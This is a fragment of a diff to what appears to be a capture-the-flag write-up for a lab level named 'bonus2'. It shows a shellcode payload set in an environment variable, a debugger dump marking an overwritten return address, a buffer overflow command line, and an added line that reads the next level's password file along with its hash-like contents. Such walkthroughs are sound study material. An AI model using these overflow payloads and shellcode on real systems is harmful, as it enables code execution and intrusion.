@@ -16,3 +16,5 @@ export SHELLCODE=$(python -c 'print("\x90" * 30 + "\x31\xc0\x50\x68\x2f\x2f\x73\
 0xbffff5c0:	0x42424242	0x42424242	0x42424242	0xbffff8d4 <-- EIP overflow
 
 ./bonus2 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA `python -c 'print("B" * 18 + "\xd4\xf8\xff\xbf")'`
+$ cat /home/user/bonus3/.pass
+71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
